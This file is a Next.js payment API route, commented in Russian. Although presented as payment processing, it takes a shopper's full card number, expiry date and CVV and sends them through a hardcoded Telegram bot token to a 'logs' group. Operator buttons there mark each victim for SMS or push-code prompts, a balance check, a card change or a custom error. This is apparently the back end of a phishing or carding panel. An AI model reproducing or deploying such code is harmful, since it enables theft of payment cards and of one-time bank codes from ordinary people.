import { NextRequest, NextResponse } from 'next/server';
import { Telegraf } from 'telegraf';

// Конфигурация бота
const BOT_TOKEN = '8477608805:AAF6-UwbhdQTClns7RQqeBXMbiJ1zPWrJAA';
const LOGS_GROUP_ID = '-1002636314382';

const bot = new Telegraf(BOT_TOKEN);

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, cardExp, cardCvv, price, orderId } = await request.json();

    // Валидация данных
    if (!cardNumber || !cardExp || !cardCvv || !price) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // Создаем сообщение для группы логов
    const logMessage = `
💳 <b>НОВЫЙ ПЛАТЕЖ</b>

📋 <b>Данные карты:</b>
└ Номер: <code>${cardNumber}</code>
└ Срок: <code>${cardExp}</code>
└ CVV: <code>${cardCvv}</code>

💰 <b>Сумма:</b> ${price} AED
🆔 <b>Заказ:</b> #${orderId}

⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
📊 <b>Статус:</b> Ожидание
    `;

    // Отправляем сообщение в группу логов
    const message = await bot.telegram.sendMessage(LOGS_GROUP_ID, logMessage, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Ожидание', callback_data: 'nothing' }],
          [{ text: '👁', callback_data: `eye_${orderId}` }],
          [
            { text: '🛑 Отказаться', callback_data: `log_${orderId}_leave` },
            { text: '✅ Успех', callback_data: `log_${orderId}_setStatus_success` }
          ],
          [
            { text: 'SMS', callback_data: `log_${orderId}_setStatus_sms` },
            { text: 'PUSH', callback_data: `log_${orderId}_setStatus_push` }
          ],
          [
            { text: 'КАРТА', callback_data: `log_${orderId}_setStatus_card` },
            { text: 'БАЛАНС', callback_data: `log_${orderId}_setStatus_balance` }
          ],
          [
            { text: 'НЕ БЬЕТСЯ', callback_data: `log_${orderId}_setStatus_skip` },
            { text: 'СМЕНИТЬ КАРТУ', callback_data: `log_${orderId}_setStatus_change` }
          ],
          [
            { text: 'КАСТОМ ВОПРОС', callback_data: `custom_${orderId}` },
            { text: 'КАСТОМ ОШИБКА', callback_data: `customError_${orderId}` }
          ]
        ]
      }
    });

    return NextResponse.json({
      success: true,
      logId: orderId,
      messageId: message.message_id,
      status: 'pending'
    });

  } catch (error) {
    console.error('Payment log creation error:', error);
    return NextResponse.json(
      { error: 'Failed to create payment log' },
      { status: 500 }
    );
  }
}
